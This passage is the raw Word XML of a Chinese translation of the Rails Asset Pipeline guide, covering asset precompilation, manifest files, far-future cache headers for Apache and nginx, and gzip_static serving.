          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Capfile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">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2400"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="69374629" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="05495464" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="149101048"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>load 'deploy/assets'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="088B77D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这把在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.prefix</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里指定的目录链接到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>shared/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. 如果你已经使用了这个共享文件夹, 那你就需要自己写一个部署任务了.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6980A6D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这个目录在各部署之间共享是很重要的, 因为这样做可以让远程缓存的页面(来自旧的已编译资源)依然对有已缓存页面有效.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078CF04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如果你在本地预编译资源, 你可以在服务器上使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>bundle install --without assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 去避免安装资源 gem ( Gemfile 里资源分组的 gems).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44EB994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编译文件的默认匹配器包括 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和所有非 JS/CSS 文件 (会自动包含所有的图像资源):</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29305D35" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D643ACC" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="444039094"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>[ Proc.new{ |path| !File.extname(path).in?(['.js', '.css']) }, /application.(css|js)$/ ]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F747D7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那些匹配器 (和其它在预编译数组里的成员; 看下面) 适用已经最后编译好的文件名. 也就是说所有要编译成 JS/CSS 的文件都不会被包含, 要和 JS/CSS 文件一样; 例如, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.coffee</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.scss</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件都*不*会被自动包含进去,因为它们要编译成 JS/CSS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FE157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如果又其它的 manifests 或者单独的式样和 JavaScript 文件要包含, 你应该将它们添加到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>precompile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 数组里:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="72E842E8" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1889A0BD" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="514156302"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.assets.precompile += ['admin.js', 'admin.css', 'swfObject.js']</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="535BACB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rake 任务也会生成一个 +manifest.yml , 这个文件包含了所有资源和它们各自的指纹识别列表. 这被 Rails helper 方法用于避免将匹配请求调回给 Sprockets. 常规的资源清单文件像这样:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="23737A0E" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7EFE2B8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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77D85FE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rails.png: rails-bd9ad5a560b5a3a7be0808c5cd76a798.png</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42E367E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jquery-ui.min.js: jquery-ui-7e33882a28fc84ad0e0e47e46cbf901c.min.js</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2915B3B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jquery.min.js: jquery-8a50feed8d29566738ad005e19fe1c2d.min.js</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="409BCF5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application.js: application-3fdab497b8fb70d20cfc5495239dfc29.js</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="346F0DD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application.css: application-8af74128f904600e41a6e39241464e03.css</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="201E295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manifest 的默认位置是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.prefix</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (默认为 ‘/assets’) 指定的位置. 这可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.manifest</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项更改, 并且必须指定一个完整的路径:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="6F166C30" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4025395D" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1513450534"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.assets.manifest = '/path/to/some/other/location'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A41719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如果在生产环境中有已预编译资源的丢失, 你将会得到一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Sprockets::Helpers::RailsHelper::AssetPaths::AssetNotPrecompiledError</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 异常去指明丢失的文件名.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB05765"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4.1.1 Far-future Expires header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4715A2D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已预编译的资源存在于文件系统里并且直接由你的 web 服务器提供。它们默认不具有 far-future 头部， 由于指纹识别的影响，你不得不更改你的服务器配置去添加它们。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24151A8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对于 Apache:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7440"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="535E098B" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="58A8642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&lt;LocationMatch "^/assets/.*$"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F16BFE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Use of ETag is discouraged when Last-Modified is present</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36CBC57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Header unset ETag</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="426294C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FileETag None</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AF2ABD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RFC says only cache for 1 year</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AB792F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ExpiresActive On</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F8D5C6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ExpiresDefault "access plus 1 year"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D1FADD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&lt;/LocationMatch&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="59A108E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对于 nginx:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="04FCE34A" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="11DFD6A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location ~ ^/assets/ {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="533B39E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expires 1y;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="222966A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add_header Cache-Control public;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2954DC2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378FA8A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add_header ETag "";</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D46D82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break;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41DE375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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="74A83E95"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4.1.2 GZip 压缩器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7575DCE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当文件被预编译时， Sprockets 也会创建一个 </w:t>
      </w:r>
      <w:hyperlink r:id="rId965" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>gzipped</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (.gz) 版本的资源文件。 Web 服务器一般会配置使用一个适当的压缩率作为折衷方案，但由于预编译只发生一次，Sprockets 使用最大的压缩比率。 这样可以使传输的数据达到最小值。另外， web 服务器可以配置成直接从磁盘获取压缩内容， 而不用自己压缩这些未压缩文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A77C3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Nginx 会在开启 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>gzip_static</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 时自动这么做：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6000"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="30D9BA85" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4555AAD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location ~ ^/(assets)/  {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0287D7E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root /path/to/public;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="307315B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gzip_static on; # to serve pre-gzipped version</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A158C1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expires max;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37AC211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add_header Cache-Control public;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="617DC41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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2BD5515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这个指令在提供了该功能的核心模块被编译进 web 服务器时可用。 Ubuntu 的软件包, 即使是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nginx-light</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 也有编译这个模块。不然， 你就需要自己手动编译：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="7B4B0F2E" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="319D5177" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1695155354"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>./configure --with-http_gzip_static_module</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0992467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如果你用 Phusion Passenger 编译 nginx， 那么你需要在提示这个选项时让它通过。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA5BBF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强制配置 Apache 是可行的，但棘手。 请 Google。 (或者请更新这个指南，如果你有对 Apache 很好的配置示例)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3028B4D2"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4.2 即时编译</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24AD97B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有些情况你也像使用即时编译。在这个模式下，所有的资源请求都直接由 Sprockets 处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A1D62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开启这个选项：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="32075FEC" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="05A1FA2E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1798991659"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
